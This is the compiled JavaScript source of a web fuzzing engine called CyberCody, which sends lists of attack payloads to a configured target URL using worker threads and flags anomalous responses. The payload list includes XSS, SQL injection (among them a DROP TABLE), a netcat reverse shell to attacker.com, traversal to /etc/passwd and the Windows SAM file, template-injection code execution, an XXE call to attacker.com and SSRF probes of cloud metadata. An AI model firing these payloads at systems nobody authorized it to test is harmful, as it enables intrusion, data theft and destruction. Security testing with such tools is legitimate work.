"use strict";
// ╔══════════════════════════════════════════════════════════════════════════════╗
// ║  CYBERCODY v1.0.0 - FUZZING ENGINE                                           ║
// ║  "The Chaos Monkey" - Intelligent Input Mutation & Anomaly Detection         ║
// ║  Worker Threads Powered for Maximum Scanning Speed                           ║
// ╚══════════════════════════════════════════════════════════════════════════════╝
Object.defineProperty(exports, "__esModule", { value: true });
exports.FuzzingEngine = void 0;
const worker_threads_1 = require("worker_threads");
// ═══════════════════════════════════════════════════════════════════════════════
// 🔥 PAYLOAD DATABASE - Attack Vectors
// ═══════════════════════════════════════════════════════════════════════════════
const PAYLOADS = {
    xss: [
        // Classic XSS
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        // Event handlers
        '<div onmouseover=alert(1)>hover</div>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        // Encoded variants
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        // Template literals
        '${alert(1)}',
        '{{constructor.constructor("alert(1)")()}}',
        // Polyglot
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    ],
    sqli: [
        // Classic SQLi
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        '" OR "1"="1',
        "1' AND '1'='1",
        '1 OR 1=1',
        "'; DROP TABLE users; --",
        // UNION based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        // Time-based blind
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        // Error-based
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        // Boolean-based
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SUBSTRING(@@version,1,1)='5'--",
    ],
    nosqli: [
        // MongoDB injection
        '{"$gt":""}',
        '{"$ne":null}',
        '{"$regex":".*"}',
        '{"$where":"1==1"}',
        "'; return true; var foo='",
        '{"$gt": ""}',
        '[$ne]=1',
        // Operator injection
        'username[$ne]=admin',
        'password[$regex]=.*',
        'username[$gt]=',
    ],
    cmdi: [
        // Unix command injection
        '; ls -la',
        '| cat /etc/passwd',
        '`id`',
        '$(whoami)',
        '; cat /etc/passwd',
        '| id',
        '|| id',
        '&& id',
        '; ping -c 3 127.0.0.1',
        '| nc -e /bin/sh attacker.com 4444',
        // Windows command injection
        '| dir',
        '& type C:\\Windows\\System32\\drivers\\etc\\hosts',
        '| net user',
        '& whoami',
        // Newline injection
        '%0Aid',
        '%0d%0aid',
        '\\nid',
    ],
    pathtraversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc/passwd',
        '/etc/passwd%00',
        '....\\....\\....\\windows\\win.ini',
        '..%c0%af..%c0%af..%c0%afetc/passwd',
        'file:///etc/passwd',
        '/proc/self/environ',
    ],
    ssti: [
        // Jinja2 / Twig
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '*{7*7}',
        '@(7*7)',
        // Advanced SSTI
        "{{config.items()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        // Freemarker
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }',
    ],
    xxe: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><data>&xxe;</data>',
    ],
    ssrf: [
        'http://127.0.0.1:80',
        'http://localhost:22',
        'http://[::1]:80',
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'file:///etc/passwd',
        'dict://127.0.0.1:11211/stat',
        'gopher://127.0.0.1:25/_HELO',
        'http://0.0.0.0:80',
        'http://0177.0.0.1/',
        'http://2130706433/',
    ],
    idor: [
        '1',
        '0',
        '-1',
        '999999',
        'admin',
        '../1',
        '1;2',
        '1,2',
        'null',
        'undefined',
        'NaN',
    ],
    overflow: [
        'A'.repeat(256),
        'A'.repeat(1024),
        'A'.repeat(4096),
        'A'.repeat(65536),
        '%n'.repeat(100),
        '%s'.repeat(100),
        String(Number.MAX_SAFE_INTEGER + 1),
        String(-1),
        String(0xffffffff),
        String(2147483647),
        String(-2147483648),
    ],
    format: [
        '%s%s%s%s%s%s%s%s%s%s',
        '%p%p%p%p%p%p%p%p%p%p',
        '%x%x%x%x%x%x%x%x%x%x',
        '%n%n%n%n%n%n%n%n%n%n',
        '%d'.repeat(50),
        '%.16705x%n',
    ],
    unicode: [
        '\u0000',
        '\uFFFF',
        '\u202E', // Right-to-left override
        '\uFEFF', // BOM
        '\u0000test',
        'test\u0000admin',
        '﷽'.repeat(100), // Longest Unicode character
    ],
    null: [
        '\x00',
        '%00',
        '\0',
        'test%00.jpg',
        'test.php%00.jpg',
        '\x00\x00\x00\x00',
    ],
    boundary: [
        '',
        ' ',
        '\t',
        '\n',
        '\r\n',
        '0',
        '-0',
        '0.0',
        'null',
        'undefined',
        'NaN',
        'Infinity',
        '-Infinity',
        '[]',
        '{}',
        'true',
        'false',
    ],
};
// Worker thread execution
if (!worker_threads_1.isMainThread && worker_threads_1.parentPort) {
    const data = worker_threads_1.workerData;
    (async () => {
        const iterations = [];
        let iterationId = 0;
        for (const { payload, category } of data.payloads) {
            try {
                // Build request URL with fuzzed parameter
                let url = data.target;
                let body;
                const headers = { ...data.headers };
                if (data.parameter.type === 'query') {
                    const urlObj = new URL(url);
                    urlObj.searchParams.set(data.parameter.name, payload);
                    url = urlObj.toString();
                }
                else if (data.parameter.type === 'body') {
                    body = JSON.stringify({ [data.parameter.name]: payload });
                    headers['Content-Type'] = 'application/json';
                }
                else if (data.parameter.type === 'header') {
                    headers[data.parameter.name] = payload;
                }
                const startTime = Date.now();
                const response = await fetch(url, {
                    method: data.method,
                    headers,
                    body,
                    signal: AbortSignal.timeout(data.timeoutMs),
                });
                const responseTime = Date.now() - startTime;
                const responseBody = await response.text();
                const responseHeaders = {};
                response.headers.forEach((value, key) => {
                    responseHeaders[key] = value;
                });
                // Detect anomalies
                const anomaly = detectAnomaly(payload, {
                    statusCode: response.status,
                    responseTime,
                    bodyLength: responseBody.length,
                    body: responseBody,
                    headers: responseHeaders,
                }, data.baselineResponse);
                iterations.push({
                    id: iterationId++,
                    payload,
                    category,
                    parameter: data.parameter.name,
                    request: {
                        url,
                        method: data.method,
                        headers,
                        body,
                    },
                    response: {
                        statusCode: response.status,
                        headers: responseHeaders,
                        body: responseBody.substring(0, 10000), // Limit body size
                        responseTime,
                        size: responseBody.length,
                    },
                    anomaly,
                    timestamp: new Date(),
                });
                // Rate limiting delay
                if (data.delayMs > 0) {
                    await new Promise((resolve) => setTimeout(resolve, data.delayMs));
                }
            }
            catch (error) {
                // Network error or timeout - still record it
                iterations.push({
                    id: iterationId++,
                    payload,
                    category,
                    parameter: data.parameter.name,
                    request: {
                        url: data.target,
                        method: data.method,
                        headers: data.headers,
                    },
                    response: {
                        statusCode: 0,
                        headers: {},
                        body: `Error: ${error instanceof Error ? error.message : 'Unknown error'}`,
                        responseTime: 0,
                        size: 0,
                    },
                    anomaly: {
                        detected: true,
                        type: ['behavior_change'],
                        severity: 'low',
                        indicators: ['Request failed - possible WAF or crash'],
                    },
                    timestamp: new Date(),
                });
            }
        }
        worker_threads_1.parentPort.postMessage({ taskId: data.taskId, iterations });
    })();
}
/**
 * Detect anomalies in response compared to baseline
 */
function detectAnomaly(payload, response, baseline) {
    const types = [];
    const indicators = [];
    // Status code change
    if (response.statusCode !== baseline.statusCode) {
        types.push('status_change');
        indicators.push(`Status changed from ${baseline.statusCode} to ${response.statusCode}`);
    }
    // Error disclosure
    const errorPatterns = [
        /SQL syntax/i,
        /mysql_/i,
        /pg_query/i,
        /ORA-\d+/i,
        /Microsoft OLE DB/i,
        /ODBC.*Driver/i,
        /syntax error/i,
        /stack trace/i,
        /exception in/i,
        /at line \d+/i,
        /undefined variable/i,
        /cannot find/i,
        /null pointer/i,
    ];
    for (const pattern of errorPatterns) {
        if (pattern.test(response.body)) {
            types.push('error_disclosure');
            indicators.push(`Error pattern detected: ${pattern.source}`);
            break;
        }
    }
    // Timing anomaly (>3x baseline)
    if (response.responseTime > baseline.responseTime * 3) {
        types.push('timing_anomaly');
        indicators.push(`Response time ${response.responseTime}ms vs baseline ${baseline.responseTime}ms`);
    }
    // Size anomaly (>50% difference)
    const sizeDiff = Math.abs(response.bodyLength - baseline.bodyLength) / baseline.bodyLength;
    if (sizeDiff > 0.5) {
        types.push('size_anomaly');
        indicators.push(`Size difference: ${Math.round(sizeDiff * 100)}%`);
    }
    // Reflection detection
    if (response.body.includes(payload) || response.body.includes(encodeURIComponent(payload))) {
        types.push('reflection');
        indicators.push('Input reflected in response');
    }
    // Determine severity
    let severity = 'none';
    if (types.length > 0) {
        if (types.includes('error_disclosure') || types.includes('reflection')) {
            severity = 'high';
        }
        else if (types.includes('status_change') && response.statusCode >= 500) {
            severity = 'critical';
        }
        else if (types.includes('timing_anomaly')) {
            severity = 'medium';
        }
        else {
            severity = 'low';
        }
    }
    return {
        detected: types.length > 0,
        type: types,
        severity,
        indicators,
    };
}
/**
 * Fuzzing Engine for CyberCody
 * Uses Worker Threads for parallel fuzzing with intelligent anomaly detection
 */
class FuzzingEngine {
    // Configuration is passed directly to fuzz() method
    constructor(_config = {}) {
        // Configuration stored for future use if needed
        // Default values are handled in the fuzz() method
    }
    /**
     * Run fuzzing campaign against target
     */
    async fuzz(config) {
        const startTime = new Date();
        const allIterations = [];
        // Get baseline response
        const baseline = await this.getBaseline(config);
        // Build payload list
        const payloads = this.buildPayloadList(config);
        // Split payloads across workers
        const workerCount = Math.min(config.workerCount, payloads.length);
        const chunks = this.chunkArray(payloads, workerCount);
        // Run workers in parallel
        const workerPromises = chunks.map((chunk, index) => this.runWorker({
            taskId: `fuzz-${index}`,
            target: config.target,
            method: config.method,
            payloads: chunk,
            parameter: config.parameters.find((p) => p.fuzz),
            headers: config.headers ?? {},
            baselineResponse: baseline,
            timeoutMs: config.timeoutMs,
            delayMs: config.delayMs,
        }));
        const results = await Promise.all(workerPromises);
        // Combine results
        for (const result of results) {
            allIterations.push(...result.iterations);
        }
        // Calculate statistics
        const statistics = this.calculateStatistics(allIterations);
        const anomaliesFound = allIterations.filter((i) => i.anomaly.detected);
        return {
            target: config.target,
            config,
            startTime,
            endTime: new Date(),
            totalIterations: payloads.length,
            completedIterations: allIterations.length,
            anomaliesFound,
            statistics,
        };
    }
    /**
     * Get baseline response for comparison
     */
    async getBaseline(config) {
        const startTime = Date.now();
        try {
            const response = await fetch(config.target, {
                method: config.method,
                headers: config.headers,
                signal: AbortSignal.timeout(config.timeoutMs),
            });
            const body = await response.text();
            return {
                statusCode: response.status,
                responseTime: Date.now() - startTime,
                bodyLength: body.length,
            };
        }
        catch {
            return {
                statusCode: 200,
                responseTime: 1000,
                bodyLength: 1000,
            };
        }
    }
    /**
     * Build complete payload list from categories
     */
    buildPayloadList(config) {
        const payloads = [];
        for (const category of config.payloadCategories) {
            const categoryPayloads = PAYLOADS[category] ?? [];
            for (const payload of categoryPayloads) {
                payloads.push({ payload, category });
            }
        }
        // Add custom payloads
        if (config.customPayloads) {
            for (const payload of config.customPayloads) {
                payloads.push({ payload, category: 'boundary' });
            }
        }
        // Limit to configured iterations
        return payloads.slice(0, config.iterations);
    }
    /**
     * Run a worker thread
     */
    runWorker(data) {
        return new Promise((resolve, reject) => {
            // Use URL for ESM compatibility
            const workerPath = new URL('./fuzzing.js', import.meta.url).pathname.replace(/^\/([A-Z]:)/, '$1');
            const worker = new worker_threads_1.Worker(workerPath, { workerData: data });
            worker.on('message', (result) => {
                resolve(result);
                worker.terminate();
            });
            worker.on('error', (error) => {
                reject(error);
                worker.terminate();
            });
            worker.on('exit', (code) => {
                if (code !== 0) {
                    reject(new Error(`Worker exited with code ${code}`));
                }
            });
        });
    }
    /**
     * Split array into chunks
     */
    chunkArray(array, chunks) {
        const result = [];
        const chunkSize = Math.ceil(array.length / chunks);
        for (let i = 0; i < array.length; i += chunkSize) {
            result.push(array.slice(i, i + chunkSize));
        }
        return result;
    }
    /**
     * Calculate fuzzing statistics
     */
    calculateStatistics(iterations) {
        const statusCodes = {};
        const anomalyTypes = {};
        let totalTime = 0;
        let minTime = Infinity;
        let maxTime = 0;
        let successful = 0;
        let failed = 0;
        for (const iteration of iterations) {
            const time = iteration.response.responseTime;
            totalTime += time;
            minTime = Math.min(minTime, time);
            maxTime = Math.max(maxTime, time);
            if (iteration.response.statusCode > 0) {
                successful++;
                statusCodes[iteration.response.statusCode] =
                    (statusCodes[iteration.response.statusCode] ?? 0) + 1;
            }
            else {
                failed++;
            }
            for (const type of iteration.anomaly.type) {
                anomalyTypes[type] = (anomalyTypes[type] ?? 0) + 1;
            }
        }
        return {
            totalRequests: iterations.length,
            successfulRequests: successful,
            failedRequests: failed,
            averageResponseTime: totalTime / iterations.length,
            minResponseTime: minTime === Infinity ? 0 : minTime,
            maxResponseTime: maxTime,
            statusCodeDistribution: statusCodes,
            anomalyDistribution: anomalyTypes,
        };
    }
    /**
     * Get available payload categories
     */
    getPayloadCategories() {
        return Object.keys(PAYLOADS);
    }
    /**
     * Get payload count for a category
     */
    getPayloadCount(category) {
        return PAYLOADS[category]?.length ?? 0;
    }
}
exports.FuzzingEngine = FuzzingEngine;
exports.default = FuzzingEngine;
